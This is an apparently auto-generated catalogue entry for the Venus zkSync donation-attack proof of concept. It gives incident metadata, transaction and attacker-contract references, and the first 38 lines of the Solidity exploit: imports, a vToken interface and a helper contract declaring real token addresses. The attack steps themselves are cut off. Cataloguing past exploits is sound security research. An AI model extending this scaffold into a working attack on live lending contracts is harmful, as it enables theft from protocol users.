# [?] Venus_ZKSync - Donation Attack

## Summary
Severity: Unknown
Chain: zkSync
Component: Venus_ZKSync
Published: 2025-02-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/Venus_ZKSync_exp.sol
Type: defi-exploit-poc

## Details
Lost: 86.72 WETH

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IAaveFlashloan, IERC20, IERC4626, IUnitroller} from "../interface.sol";

// @KeyInfo - Simplified explicit PoC (zkSync Era)
// Tx: https://explorer.zksync.io/tx/0x35a0172fb6bd450ceb29aa67dc85221826dfd0b7528375400b4ccf15c1eed0d8
// Attack Contract : https://explorer.zksync.io/address/0x68c8020A052d5061760e2AbF5726D59D4ebe3506
// Block: 56669987

// @Analysis
// Post-mortem :https://community.venus.io/t/post-mortem-wusdm-donation-attack-on-venus-zksync/5004

interface IVTokenSimplified {
    function balanceOf(address owner) external view returns (uint256);

    function mint(uint256 mintAmount) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
}

contract ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper {
    IERC20 internal constant WETH = IERC20(0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91);
    IERC20 internal constant wUSDM = IERC20(0xA900cbE7739c96D2B153a273953620A701d5442b);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/Venus_ZKSync_exp.sol_
